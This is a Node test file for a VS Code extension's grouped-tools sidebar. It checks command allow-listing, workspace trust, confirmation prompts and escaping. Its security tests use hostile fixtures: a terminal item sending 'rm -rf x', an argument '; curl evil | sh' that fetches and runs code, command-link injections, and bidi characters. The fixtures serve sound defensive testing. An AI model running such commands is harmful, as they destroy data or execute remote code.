const { test } = require('node:test');
const assert = require('node:assert/strict');
const Module = require('node:module');
const path = require('node:path');
const fsp = require('node:fs/promises');

const root = path.resolve(__dirname, '..');
const srcDir = path.join(root, 'src') + path.sep;

// Loads src/extension.js against a vscode stub, isolated from other tests.
function load(vscode) {
  for (const key of Object.keys(require.cache)) if (key.startsWith(srcDir)) delete require.cache[key];
  const originalLoad = Module._load;
  Module._load = function (request, ...rest) { return request === 'vscode' ? vscode : originalLoad.call(this, request, ...rest); };
  try { return require('../src/extension.js'); } finally { Module._load = originalLoad; }
}

function setup(overrides = {}) {
  const gstore = overrides.firstRun ? {} : { welcomed: true }, infos = [];
  const store = {}, calls = [], updates = [], messages = [], contexts = [];
  const handlers = { config: [], extensions: [], editor: [], folders: [], trust: [] };
  const warnings = [];
  const groups = JSON.parse(JSON.stringify(require('../package.json').contributes.configuration.properties['groupedTools.groups'].default));
  const created = [], providers = new Map(), commandHandlers = new Map(), statusItems = [];
  const mk = () => { const d = { dispose() { d.disposed = true; } }; created.push(d); return d; };
  const disposable = { dispose() {} };
  const inspected = { defaultValue: groups, ...(overrides.inspect || {}) };
  const config = { get: () => groups, inspect: () => inspected, update: async (...args) => updates.push(args) };
  const reads = [];
  class MarkdownString {
    constructor(value = '', themeIcons = false) { this.value = value; this.supportThemeIcons = themeIcons; }
    appendMarkdown(text) { this.value += text; return this; }
  }
  const vscode = {
    ConfigurationTarget: { Global: 1, Workspace: 2 },
    StatusBarAlignment: { Left: 1, Right: 2 },
    MarkdownString,
    extensions: {
      all: overrides.extensions || [{ id: 'test.spotify', packageJSON: { name: 'Spotify', contributes: { views: { 'vscode-spotify': [{ name: 'Playlists' }] } } } }],
      getExtension: id => (id === 'test.spotify' ? { extensionUri: { fsPath: 'C:/ext/spotify', toString() { return 'file:///c%3A/ext/spotify'; } }, packageJSON: { icon: 'img/icon.png' } } : undefined),
      onDidChange: f => (handlers.extensions.push(f), mk())
    },
    Uri: { joinPath: (uri, ...parts) => ({ fsPath: path.join(uri.fsPath, ...parts), toString() { return `${uri.toString()}/${parts.join('/')}`; } }) },
    workspace: {
      name: 'AuraFit', workspaceFolders: [{}], isTrusted: true, getConfiguration: () => config,
      onDidGrantWorkspaceTrust: f => (handlers.trust.push(f), mk()),
      onDidChangeConfiguration: f => (handlers.config.push(f), mk()),
      onDidChangeWorkspaceFolders: f => (handlers.folders.push(f), mk()),
      fs: overrides.fs || { readFile: async uri => { reads.push(uri.fsPath); return fsp.readFile(uri.fsPath); } }
    },
    window: {
      registerWebviewViewProvider: (id, p) => (providers.set(id, p), mk()),
      onDidChangeActiveTextEditor: f => (handlers.editor.push(f), disposable),
      showErrorMessage: async m => calls.push(m),
      showInformationMessage: async (...a) => { infos.push(a); },
      showWarningMessage: async (...args) => { warnings.push(args); return overrides.warningAnswer; },
      createStatusBarItem: (id, alignment, priority) => {
        const item = { id, alignment, priority, shown: false, show() { item.shown = true; }, dispose() { item.disposed = true; } };
        statusItems.push(item); return item;
      }
    },
    commands: {
      registerCommand: (id, f) => (commandHandlers.set(id, f), mk()),
      executeCommand: async (...args) => { if (args[0] === 'setContext') contexts.push(args.slice(1)); else calls.push(args); }
    }
  };
  const context = { extensionUri: { fsPath: root }, subscriptions: [], workspaceState: { get: (k, d) => store[k] || d, update: async (k, v) => { store[k] = v; } },
    globalState: { get: (k, d) => gstore[k] ?? d, update: async (k, v) => { gstore[k] = v; } } };
  load(vscode).activate(context);
  const provider = providers.get('groupedTools.view');
  let onMessage, onDispose, onVisible;
  const view = {
    visible: true,
    webview: { asWebviewUri: u => u, cspSource: 'local', postMessage: m => messages.push(m), onDidReceiveMessage: f => (onMessage = f, disposable) },
    onDidChangeVisibility: f => (onVisible = f, disposable),
    onDidDispose: f => { onDispose = f; return disposable; }
  };
  return { gstore, infos, vscode, provider, providers, commandHandlers, statusItems, contexts, view, groups, config, calls, updates, messages, handlers, reads, context, created, inspected,
    warnings, send: m => onMessage(m), dispose: () => onDispose(), show: () => onVisible() };
}

const PINNED = [
  { id: 'git', name: 'Git', icon: 'git-branch', color: 'g-1', pinned: true, items: [
    { name: 'GitLens', command: 'workbench.view.extension.gitlens', extensionId: 'eamodio.gitlens' },
    { name: 'Spotify', command: 'workbench.view.extension.vscode-spotify', extensionId: 'test.spotify' }
  ] },
  { id: 'misc', name: 'Variados [x](command:evil)', icon: 'git-branch', pinned: true, items: [{ name: 'Terminal', command: 'workbench.action.terminal.toggleTerminal' }] },
  { id: 'dbs', name: 'Bancos', icon: 'database', pinned: true, items: [] }
];

test('provider: data, favorites, command whitelist and configuration refresh', async () => {
  const { vscode, provider, view, groups, config, calls, updates, messages, handlers, send } = setup();
  await provider.resolveWebviewView(view);
  assert.ok(!view.webview.html.includes('{{'));
  assert.ok(view.webview.html.includes("default-src 'none'"));
  await send({ type: 'ready' });
  const first = messages.at(-1).groups[0].items[0];
  assert.deepEqual(messages.at(-1).groups.map(g => g.name), ['Qualidade e testes'], 'the only default group');
  assert.equal(messages.at(-1).groups[0].color, 'g-7', 'g-7 is Verde');
  assert.equal(messages.at(-1).groups[0].items.length, 2);
  assert.equal(first.favorite, false);
  await send({ type: 'favorite', id: first.id });
  assert.equal(messages.at(-1).groups[0].items[0].favorite, true);
  await send({ type: 'run', id: 'invented', command: 'untrusted' });
  assert.equal(calls.length, 0);
  await send({ type: 'run', id: first.id });
  assert.equal(calls[0][0], 'workbench.actions.view.problems');
  await send({ type: 'favorite', id: first.id });
  assert.equal(messages.at(-1).groups[0].items[0].favorite, false);
  groups[0].name = 'Updated'; handlers.config[0]({ affectsConfiguration: () => true });
  assert.equal(messages.at(-1).groups[0].name, 'Updated');
  assert.equal(messages.at(-1).extensions[0].command, 'workbench.view.extension.vscode-spotify');
  await send({ type: 'saveGroups', scope: 'global', groups });
  assert.equal(updates.at(-1)[2], 1);
  await send({ type: 'saveGroups', scope: 'workspace', groups });
  assert.equal(updates.at(-1)[2], 2);
  await send({ type: 'resetGroups', scope: 'workspace' });
  assert.equal(updates.at(-1)[1], undefined);
  const before = updates.length;
  await send({ type: 'saveGroups', scope: 'global', groups: [{ name: 'Bad', items: [{ name: 'Recursive', command: 'groupedTools.run' }] }] });
  assert.equal(updates.length, before);
  assert.equal(messages.at(-1).type, 'saveError');
  vscode.workspace.workspaceFolders = [];
  await send({ type: 'saveGroups', scope: 'workspace', groups });
  assert.equal(updates.length, before);
  assert.equal(messages.at(-1).type, 'saveError');
  config.update = async () => { throw new Error('Falha de escrita'); };
  await send({ type: 'saveGroups', scope: 'global', groups });
  assert.equal(messages.at(-1).text, 'Falha de escrita');
});

test('provider: ignores config change for other settings and invalid scope/messages', async () => {
  const { provider, view, messages, updates, handlers, send } = setup();
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  const count = messages.length;
  handlers.config[0]({ affectsConfiguration: key => key !== 'groupedTools.groups' });
  assert.equal(messages.length, count);
  await send(null);
  await send({ type: 42 });
  await send({ type: 'saveGroups', scope: 'bogus', groups: [] });
  assert.equal(messages.at(-1).type, 'saveError');
  assert.equal(updates.length, 0);
});

test('refresh: not triggered by active editor changes, triggered by extensions.onDidChange', async () => {
  const { provider, view, messages, handlers, send } = setup();
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  const count = messages.length;
  assert.equal(handlers.editor.length, 0, 'no active-editor listener is registered');
  assert.equal(handlers.extensions.length, 1);
  handlers.extensions[0]();
  assert.equal(messages.length, count + 1);
  assert.equal(messages.at(-1).type, 'data');
});

test('refresh: triggered by workspace folder changes (name and hasWorkspace)', async () => {
  const { vscode, provider, view, messages, handlers, send } = setup();
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  assert.equal(messages.at(-1).hasWorkspace, true);
  vscode.workspace.workspaceFolders = []; vscode.workspace.name = undefined;
  assert.equal(handlers.folders.length, 1);
  handlers.folders[0]();
  assert.equal(messages.at(-1).hasWorkspace, false);
  assert.equal(messages.at(-1).workspace, 'Pessoal');
});

test('activate: every disposable ends up in context.subscriptions, one pin view per catalog icon', () => {
  const { context, created, providers } = setup();
  const catalog = require('../media/pin-catalog');
  assert.equal(created.length, 1 + catalog.PIN_ICONS.length + 3 + 6);
  assert.equal(context.subscriptions.length, created.length + 1, 'plus the pin manager');
  for (const d of created) assert.ok(context.subscriptions.includes(d));
  for (const icon of catalog.PIN_ICONS) assert.ok(providers.has(catalog.viewId(icon)), icon);
});

test('template: read once per provider and cached across webviews', async () => {
  const { provider, view, reads } = setup();
  await provider.resolveWebviewView(view);
  const first = view.webview.html;
  await provider.resolveWebviewView(view);
  assert.equal(reads.length, 1);
  assert.notEqual(view.webview.html, first, 'a fresh nonce is generated per resolve');
});

test('template: scripts and styles carry the nonce or the webview source, no inline style', async () => {
  const { provider, view } = setup();
  await provider.resolveWebviewView(view);
  const html = view.webview.html;
  const nonce = /script-src 'nonce-([0-9a-f]+)'/.exec(html)[1];
  const scripts = [...html.matchAll(/<script\b[^>]*>/g)].map(m => m[0]);
  assert.equal(scripts.length, 6);
  for (const tag of scripts) assert.ok(tag.includes(`nonce="${nonce}"`), tag);
  assert.ok(!/\sstyle\s*=/.test(html), 'no style attribute');
  assert.ok(!/<style\b/i.test(html), 'no inline style block');
  assert.ok(!/unsafe-inline|unsafe-eval|https?:\/\//.test(html), 'no unsafe CSP source or remote URL');
});

test('failure: missing html surfaces an error and does not throw; retry is possible', async () => {
  let fail = true;
  const real = fsp.readFile;
  const { provider, view, calls } = setup({ fs: { readFile: async uri => { if (fail) throw new Error('ENOENT'); return real(uri.fsPath); } } });
  await provider.resolveWebviewView(view);
  assert.equal(view.webview.html, undefined);
  assert.match(calls.at(-1), /ENOENT/);
  fail = false;
  await provider.resolveWebviewView(view);
  assert.ok(view.webview.html.includes("default-src 'none'"));
});

test('failure: view disposed before async read finishes never receives html', async () => {
  let release;
  const gate = new Promise(r => { release = r; });
  const { provider, view, dispose } = setup({ fs: { readFile: async uri => { await gate; return fsp.readFile(uri.fsPath); } } });
  const pending = provider.resolveWebviewView(view);
  dispose();
  release();
  await pending;
  assert.equal(view.webview.html, undefined);
  assert.equal(provider.view, undefined);
  provider.refresh(); // must not throw after dispose
});

test('pins: status bar items, context keys and hover follow the Global pinned groups (idempotent)', async () => {
  const { handlers, statusItems, contexts, inspected } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  handlers.config[0]({ affectsConfiguration: () => true });
  handlers.config[0]({ affectsConfiguration: () => true });
  // git-branch is used by two groups: the second is ignored, so two items and two keys exist
  assert.equal(statusItems.length, 2, 'items are reused across updates');
  const [git, dbs] = statusItems;
  assert.equal(git.text, '$(git-branch) Git (2)');
  assert.equal(dbs.text, '$(database) Bancos (0)');
  assert.ok(git.priority > dbs.priority);
  assert.ok(git.shown);
  assert.deepEqual(git.command, { command: 'groupedTools.openGroup', title: 'Abrir grupo no Ferramentas', arguments: ['git'] });
  assert.deepEqual(contexts.filter(c => c[1] === true).map(c => c[0]).sort(), ['groupedTools.pinned.database', 'groupedTools.pinned.git_branch']);
  assert.deepEqual(git.tooltip.isTrusted.enabledCommands, ['groupedTools.runById', 'groupedTools.openGroup', 'groupedTools.manageGroup']);
  assert.match(git.tooltip.value, /\*\*Git\*\* · 2 extensões/);
  assert.match(git.tooltip.value, /command:groupedTools\.runById\?%5B%22git%22%2C%22it-/);
  assert.match(git.tooltip.value, /!\[\|width=16,height=16\]\(file:\/\/\/c%3A\/ext\/spotify\/img\/icon\.png\)/, 'raster icon of the extension');
  assert.match(git.tooltip.value, /\[Abrir no Ferramentas\]\(command:groupedTools\.openGroup\?%5B%22git%22%5D\) \| \[Gerenciar grupo\]\(command:groupedTools\.manageGroup/);
  // unpin everything: items disposed, keys cleared
  inspected.globalValue = PINNED.map(g => ({ ...g, pinned: false }));
  handlers.config[0]({ affectsConfiguration: () => true });
  assert.ok(git.disposed && dbs.disposed);
  assert.deepEqual(contexts.slice(-2).map(c => c[1]), [false, false]);
});

test('pins: hover escapes names, never links to foreign commands, caps rows with "Ver todas"', async () => {
  const many = Array.from({ length: 18 }, (_, i) => ({ name: `Ext ${i} [x](command:workbench.action.reloadWindow)`, command: `my.command${i}` }));
  const { handlers, statusItems } = setup({ inspect: { globalValue: [{ id: 'big', name: 'Grande $(zap)', icon: 'database', pinned: true, items: many }] } });
  handlers.config[0]({ affectsConfiguration: () => true });
  const md = statusItems[0].tooltip.value;
  assert.equal(statusItems[0].text, '$(database) Grande $ (zap) (18)');
  const links = [...md.matchAll(/\]\(command:([A-Za-z.]+)/g)].map(m => m[1]);
  assert.ok(links.every(c => ['groupedTools.runById', 'groupedTools.openGroup', 'groupedTools.manageGroup'].includes(c)), links.join());
  assert.ok(!md.includes('reloadWindow)'), 'injected link target is escaped');
  assert.equal((md.match(/groupedTools\.runById/g) || []).length, 15);
  assert.match(md, /\+3 extensões · \[Ver todas\]/);
});

test('pins: uninstalled item is dimmed text, not a link', async () => {
  const { handlers, statusItems } = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', pinned: true, items: [{ name: 'Gone', command: 'workbench.view.extension.not-installed' }] }] } });
  handlers.config[0]({ affectsConfiguration: () => true });
  assert.match(statusItems[0].tooltip.value, /Gone \*\\\(não instalado\\\)\*/);
  assert.ok(!statusItems[0].tooltip.value.includes('runById'));
});

test('pins: Global pins reach the webview even while the project scope is shown; pinned flag only in Global', async () => {
  const global = PINNED.map(g => ({ ...g }));
  const { provider, view, messages, send } = setup({ inspect: { globalValue: global, workspaceValue: [{ id: 'git', name: 'Git', icon: 'git-branch', pinned: true, items: [] }] } });
  await provider.resolveWebviewView(view);
  await send({ type: 'ready', scope: 'workspace' });
  const data = messages.at(-1);
  assert.equal(data.scope.active, 'workspace');
  assert.equal('pinned' in data.groups[0], false, 'pinned is ignored in project configuration');
  assert.deepEqual(data.pins, [{ groupId: 'git', icon: 'git-branch', name: 'Git' }, { groupId: 'dbs', icon: 'database', name: 'Bancos' }]);
  await send({ type: 'setScope', scope: 'global' });
  assert.equal(messages.at(-1).groups[0].pinned, true);
});

test('persist: pins are saved in Global only, validated, and dropped for the project', async () => {
  const { provider, view, messages, updates, send } = setup();
  await provider.resolveWebviewView(view);
  const groups = [{ id: 'a', name: 'A', icon: 'database', pinned: true, items: [] }, { id: 'b', name: 'B', icon: 'cloud', items: [] }];
  await send({ type: 'saveGroups', scope: 'global', groups, op: 'x' });
  assert.equal(updates.at(-1)[1][0].pinned, true);
  await send({ type: 'saveGroups', scope: 'workspace', groups, op: 'x' });
  assert.equal('pinned' in updates.at(-1)[1][0], false);
  const count = updates.length;
  await send({ type: 'saveGroups', scope: 'global', groups: [{ ...groups[0] }, { id: 'c', name: 'C', icon: 'database', pinned: true, items: [] }] });
  assert.equal(updates.length, count);
  assert.match(messages.at(-1).text, /Só um grupo pode ser fixado por ícone/);
  await send({ type: 'saveGroups', scope: 'global', groups: [{ id: 'z', name: 'Z', icon: 'not-in-catalog', pinned: true, items: [] }] });
  assert.match(messages.at(-1).text, /não pode ser fixado/);
});

test('focus: openGroup is kept until acknowledged and resent after the webview says ready', async () => {
  const { provider, view, messages, calls, send } = setup();
  await provider.openGroup('git'); // webview does not exist yet
  assert.deepEqual(calls.splice(0), [['groupedTools.view.focus']]);
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  const focus = messages.filter(m => m.type === 'focusGroup');
  assert.equal(focus.length, 1);
  assert.deepEqual({ ...focus[0], seq: 0 }, { type: 'focusGroup', collapseOthers: true, groupId: 'git', seq: 0 });
  assert.ok(messages.findIndex(m => m.type === 'data') < messages.findIndex(m => m.type === 'focusGroup'), 'data first');
  await send({ type: 'ready' }); // reload before the ack: delivered again
  assert.equal(messages.filter(m => m.type === 'focusGroup').length, 2);
  await send({ type: 'focusAck', seq: focus[0].seq });
  await send({ type: 'ready' });
  assert.equal(messages.filter(m => m.type === 'focusGroup').length, 2, 'acknowledged: not resent');
  await provider.openGroup('git', { organize: true });
  assert.equal(messages.at(-1).organize, true);
  await provider.openGroup('bad id!'); // invalid ids are ignored
  assert.equal(messages.at(-1).groupId, 'git');
});

test('focus: pinned container click opens its group, or reports it missing', async () => {
  const { provider, providers, view, messages, inspected } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  await provider.resolveWebviewView(view);
  await providers.get('groupedTools.pin.database.view').resolveWebviewView(redirectView());
  await new Promise(r => setImmediate(r));
  assert.equal(messages.at(-1).groupId, 'dbs');
  inspected.globalValue = [];
  await provider.openPinned('database');
  assert.equal(messages.at(-1).missing, true);
  assert.equal('groupId' in messages.at(-1), false);
});

function redirectView() {
  let visibility;
  return { visible: true, webview: {}, onDidChangeVisibility: f => (visibility = f, { dispose() {} }), onDidDispose: () => ({ dispose() {} }), fire: () => visibility() };
}

test('pin redirect view: static page without script, redirects on every show but not twice at once', async () => {
  const { providers, provider, view, messages } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  await provider.resolveWebviewView(view);
  const redirect = redirectView();
  await providers.get('groupedTools.pin.git-branch.view').resolveWebviewView(redirect);
  assert.equal(redirect.webview.options.enableScripts, false);
  assert.ok(redirect.webview.html.includes("default-src 'none'"));
  assert.ok(!/<script/.test(redirect.webview.html));
  await new Promise(r => setImmediate(r));
  const count = () => messages.filter(m => m.type === 'focusGroup').length;
  assert.equal(count(), 1);
  redirect.fire(); // immediately again: guarded
  await new Promise(r => setImmediate(r));
  assert.equal(count(), 1);
  await new Promise(r => setTimeout(r, 350));
  redirect.fire();
  await new Promise(r => setImmediate(r));
  assert.equal(count(), 2);
});

test('commands: hover commands resolve ids from the configuration only', async () => {
  const { commandHandlers, calls, messages, provider, view } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  await provider.resolveWebviewView(view);
  const { readGroups } = require('../src/config');
  const git = readGroups(PINNED, { pins: true })[0];
  await commandHandlers.get('groupedTools.runById')('git', git.items[0].id);
  assert.deepEqual(calls.splice(0), [['workbench.view.extension.gitlens']]);
  await commandHandlers.get('groupedTools.runById')('git', 'invented');
  await commandHandlers.get('groupedTools.runById')({}, 5);
  await commandHandlers.get('groupedTools.runById')('nope', git.items[0].id);
  assert.equal(calls.length, 0);
  await commandHandlers.get('groupedTools.manageGroup')('git');
  assert.equal(messages.at(-1).organize, true);
  commandHandlers.get('groupedTools.toggleFold')();
  assert.equal(messages.at(-1).type, 'toggleFold');
  await commandHandlers.get('groupedTools.configure')();
  assert.equal(messages.at(-1).type, 'openEditor');
});

test('REV-1: showing the panel without a navigation restores the fold state; a navigation does not', async () => {
  const { provider, view, messages, send, show } = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  provider.navigationMs = 5000; provider.graceMs = 30;
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  const restores = () => messages.filter(m => m.type === 'restoreFold');
  await provider.openGroup('git'); // pin click: navigation in progress
  show();
  assert.equal(restores().length, 0, 'visibility caused by the navigation itself');
  show(); // the navigation is still waiting for its ack: restoreFold must not replace it
  assert.equal(restores().length, 0, 'pending focusGroup is never overwritten');
  const focus = messages.find(m => m.type === 'focusGroup');
  await send({ type: 'focusAck', seq: focus.seq });
  show();
  assert.equal(restores().length, 0, 'short grace after the ack');
  await new Promise(r => setTimeout(r, 50));
  show(); // main Activity Bar icon
  assert.equal(restores().length, 1);
  const message = restores()[0];
  await send({ type: 'focusAck', seq: message.seq });
  await send({ type: 'ready' }); // reload after the ack: not resent
  assert.equal(restores().length, 1);
  view.visible = false; show();
  assert.equal(restores().length, 1, 'hiding never restores');
});

test('REV-1: a restoreFold lost to a webview reload is resent after ready', async () => {
  const { provider, view, messages, send, show } = setup();
  await provider.resolveWebviewView(view);
  show();
  await send({ type: 'ready' });
  assert.equal(messages.filter(m => m.type === 'restoreFold').length, 2, 'immediate post plus redelivery after ready');
});

test('SEC-1: project items with args or non-view commands need a one-time confirmation; global items do not', async () => {
  const risky = [{ id: 'p', name: 'P', icon: 'cloud', items: [
    { name: 'Shell', command: 'workbench.action.terminal.sendSequence', args: [{ text: 'rm -rf x' }] },
    { name: 'Palette', command: 'workbench.action.showCommands' },
    { name: 'Evil', command: 'some.ext.deleteEverything' },
    { name: 'View', command: 'workbench.view.explorer' }
  ] }];
  const run = async answer => {
    const t = setup({ warningAnswer: answer, inspect: { workspaceValue: risky, globalValue: risky } });
    await t.provider.resolveWebviewView(t.view);
    await t.send({ type: 'ready', scope: 'workspace' });
    return t;
  };
  let t = await run(undefined); // the user dismisses the modal
  const ids = t.messages.at(-1).groups[0].items.map(i => i.id);
  await t.send({ type: 'run', id: ids[3] });
  assert.equal(t.warnings.length, 0, 'plain workbench.view.* needs no prompt');
  assert.equal(t.calls.splice(0).length, 1);
  await t.send({ type: 'run', id: ids[1] });
  assert.equal(t.warnings.length, 0, 'listed harmless action without args needs no prompt');
  assert.equal(t.calls.splice(0).length, 1);
  for (const id of [ids[0], ids[2]]) await t.send({ type: 'run', id });
  assert.equal(t.warnings.length, 2);
  assert.equal(t.calls.length, 0, 'declined: nothing executed');
  assert.match(t.warnings[0][1].detail, /sendSequence/);
  assert.match(t.warnings[0][1].detail, /rm -rf x/);
  assert.equal(t.warnings[0][1].modal, true);

  t = await run('Executar e lembrar');
  await t.send({ type: 'run', id: ids[2] });
  assert.equal(t.calls.splice(0)[0][0], 'some.ext.deleteEverything');
  await t.send({ type: 'run', id: ids[2] });
  assert.equal(t.warnings.length, 1, 'remembered by item key');
  assert.equal(t.calls.splice(0).length, 1);

  t = await run(undefined);
  await t.send({ type: 'ready', scope: 'global' });
  await t.send({ type: 'run', id: ids[2] });
  assert.equal(t.warnings.length, 0, 'global scope is the user own configuration');
  assert.equal(t.calls.splice(0)[0][0], 'some.ext.deleteEverything');
});

test('SEC-2: an untrusted workspace reads and writes only the Global value', async () => {
  const globalValue = [{ id: 'g', name: 'Global', icon: 'cloud', pinned: true, items: [] }];
  const workspaceValue = [{ id: 'w', name: 'Project', icon: 'cloud', items: [{ name: 'X', command: 'evil.cmd' }] }];
  const t = setup({ inspect: { globalValue, workspaceValue } });
  t.vscode.workspace.isTrusted = false;
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready', scope: 'workspace' });
  const data = t.messages.at(-1);
  assert.equal(data.scope.active, 'global');
  assert.equal(data.scope.trusted, false);
  assert.equal(data.scope.projectOverride, false);
  assert.deepEqual(data.groups.map(g => g.name), ['Global']);
  assert.deepEqual(t.provider.pinnedState().map(g => g.name), ['Global']);
  await t.send({ type: 'saveGroups', scope: 'workspace', groups: workspaceValue });
  assert.equal(t.messages.at(-1).type, 'saveError');
  assert.match(t.messages.at(-1).text, /não é confiável/);
  assert.equal(t.updates.length, 0);
  const id = require('../src/config').readGroups(workspaceValue)[0].items[0].id;
  await t.send({ type: 'run', id });
  assert.equal(t.calls.length, 0, 'project items cannot run while untrusted');
  t.vscode.workspace.isTrusted = true;
  t.handlers.trust[0]();
  assert.equal(t.messages.at(-1).scope.trusted, true);
});

test('SEC-3/SEC-6: groupedTools.run is not registered; hover entry points never run as items', async () => {
  const t = setup();
  assert.equal(t.commandHandlers.has('groupedTools.run'), false);
  for (const command of ['groupedTools.run', 'groupedTools.runById', 'groupedTools.openGroup', 'groupedTools.manageGroup']) {
    const x = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [{ name: 'B', command }, { name: 'Ok', command: 'workbench.view.explorer' }] }] } });
    await x.provider.resolveWebviewView(x.view);
    await x.send({ type: 'ready' });
    assert.deepEqual(x.messages.at(-1).groups[0].items.map(i => i.name), ['Ok'], command);
  }
});

test('QA-8: names with control and bidi characters are cleaned in status text and hover', async () => {
  const name = ['Ab', '‮', 'c', '​', 'd', '\n', 'E'].join('');
  const item = ['I', '⁧', 'tem', '\u0007'].join('');
  const { handlers, statusItems } = setup({ inspect: { globalValue: [{ id: 'g', name, icon: 'cloud', pinned: true, items: [{ name: item, command: 'workbench.view.explorer' }] }] } });
  handlers.config[0]({ affectsConfiguration: () => true });
  assert.equal(statusItems[0].text, '$(cloud) Abcd E (1)');
  assert.equal(/[‪-‮⁦-⁩​\u0007]/.test(statusItems[0].tooltip.value), false);
});

async function projectRun(items, answer) {
  const risky = [{ id: 'p', name: 'P', icon: 'cloud', items }];
  const t = setup({ warningAnswer: answer, inspect: { workspaceValue: risky, globalValue: risky } });
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready', scope: 'workspace' });
  t.ids = t.messages.at(-1).groups[0].items.map(i => i.id);
  return t;
}

test('SEC-7: the modal shows long args fully escaped, marks truncation and refuses permanent approval', async () => {
  const args = ['a'.repeat(60) + ' '.repeat(40) + '; curl evil | sh'];
  const t = await projectRun([{ name: 'X', command: 'workbench.action.terminal.sendSequence', args }], 'Executar e lembrar');
  await t.send({ type: 'run', id: t.ids[0] });
  assert.equal(t.warnings.length, 1);
  const [, options, ...buttons] = t.warnings[0];
  assert.ok(options.detail.includes('curl evil'), 'the payload is visible, not cut off');
  assert.equal(options.modal, true);
  assert.ok(buttons.includes('Executar e lembrar') && buttons.includes('Executar uma vez'));
  const long = await projectRun([{ name: 'L', command: 'some.cmd', args: ['x'.repeat(2000)] }], 'Executar e lembrar');
  await long.send({ type: 'run', id: long.ids[0] });
  assert.match(long.warnings[0][1].detail, /truncado, \d+ caracteres no total/);
  assert.deepEqual(long.warnings[0].slice(2), ['Executar uma vez'], 'no remember button');
  assert.equal(long.calls.length, 0, 'answering the remember label does nothing when it was not offered');
  const once = await projectRun([{ name: 'L', command: 'some.cmd', args: ['x'.repeat(2000)] }], 'Executar uma vez');
  await once.send({ type: 'run', id: once.ids[0] });
  await once.send({ type: 'run', id: once.ids[0] });
  assert.equal(once.warnings.length, 2, 'never remembered');
  assert.equal(once.calls.length, 2);
});

test('SEC-7/SEC-9: bidi and control characters are shown as escapes; command comes first, name is quoted', async () => {
  const args = ['a' + String.fromCharCode(0x202E) + 'b' + String.fromCharCode(0x200B)];
  const t = await projectRun([{ name: 'Ok\nComando: workbench.view.explorer', command: 'some.cmd', args }], undefined);
  await t.send({ type: 'run', id: t.ids[0] });
  const d = t.warnings[0][1].detail;
  assert.ok(d.startsWith('Comando: some.cmd'));
  assert.ok(d.includes('\\u202E'));
  assert.ok(d.includes('\\u200B'));
  assert.equal(d.includes(String.fromCharCode(0x202E)) || d.includes(String.fromCharCode(0x200B)), false);
  assert.ok(d.includes('Nome do item: “Ok Comando: workbench.view.explorer”'));
  assert.equal(d.split('\n').filter(l => l.startsWith('Comando:')).length, 1, 'a name cannot add a second label line');
});

test('SEC-8: tasks, debug, terminal actions and runCommands need confirmation; only listed actions and views skip it', async () => {
  const items = ['workbench.action.tasks.build', 'workbench.action.tasks.test', 'workbench.action.tasks.reRunTask', 'workbench.action.debug.start',
    'workbench.action.debug.run', 'workbench.action.terminal.runActiveFile', 'workbench.action.terminal.runSelectedText', 'runCommands', 'workbench.action.files.saveAll']
    .map((command, i) => ({ name: `i${i}`, command }));
  const t = await projectRun(items, undefined);
  for (const id of t.ids) await t.send({ type: 'run', id });
  assert.equal(t.warnings.length, items.length, 'every one asked');
  assert.equal(t.calls.length, 0);
  const safe = await projectRun([{ name: 'v', command: 'workbench.view.scm' }, { name: 'p', command: 'workbench.action.showCommands' }, { name: 'q', command: 'workbench.action.quickOpen' }], undefined);
  for (const id of safe.ids) await safe.send({ type: 'run', id });
  assert.equal(safe.warnings.length, 0);
  assert.equal(safe.calls.length, 3);
});

test('SEC-10: runCommands in a project asks and the modal lists its args', async () => {
  const t = await projectRun([{ name: 'RC', command: 'runCommands', args: [{ commands: ['groupedTools.runById'] }] }], undefined);
  await t.send({ type: 'run', id: t.ids[0] });
  assert.equal(t.warnings.length, 1);
  assert.ok(t.warnings[0][1].detail.includes('groupedTools.runById'));
});

test('SEC-11: approvals and favorites are stored as SHA-256; legacy plain favorites still work and migrate', async () => {
  const { favoriteKey } = require('../src/config');
  const t = await projectRun([{ name: 'Evil', command: 'some.cmd', args: ['secret-arg'] }], 'Executar e lembrar');
  await t.send({ type: 'run', id: t.ids[0] });
  const stored = t.context.workspaceState.get('approvedItems', []);
  assert.equal(stored.length, 1);
  assert.match(stored[0], /^h:[0-9a-f]{64}$/);
  assert.ok(!JSON.stringify(stored).includes('secret-arg'));
  await t.send({ type: 'run', id: t.ids[0] });
  assert.equal(t.warnings.length, 1, 'hash recognised on the next run');

  const legacy = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [{ name: 'A', command: 'workbench.view.explorer' }] }] } });
  await legacy.context.workspaceState.update('favorites', [favoriteKey({ name: 'A', command: 'workbench.view.explorer' })]);
  await legacy.provider.resolveWebviewView(legacy.view);
  await legacy.send({ type: 'ready' });
  const it = legacy.messages.at(-1).groups[0].items[0];
  assert.equal(it.favorite, true, 'legacy key kept');
  await legacy.send({ type: 'favorite', id: it.id });
  assert.equal(legacy.messages.at(-1).groups[0].items[0].favorite, false);
  assert.deepEqual(legacy.context.workspaceState.get('favorites'), []);
  await legacy.send({ type: 'favorite', id: it.id });
  assert.match(legacy.context.workspaceState.get('favorites')[0], /^h:/);
  assert.equal(legacy.messages.at(-1).groups[0].items[0].favorite, true);
});

test('QA-9: the data message counts groups and items that were dropped as invalid', async () => {
  const raw = [{ name: ' ', items: [] }, { name: 'ok', items: [{ name: 'x', command: 'groupedTools.runById' }, { name: 'big', command: 'c', args: ['x'.repeat(5000)] }, { name: 'fine', command: 'c' }] }];
  const t = setup({ inspect: { globalValue: raw } });
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready' });
  const m = t.messages.at(-1);
  assert.equal(m.stats.invalid, 3);
  assert.deepEqual(m.groups[0].items.map(i => i.name), ['fine']);
});

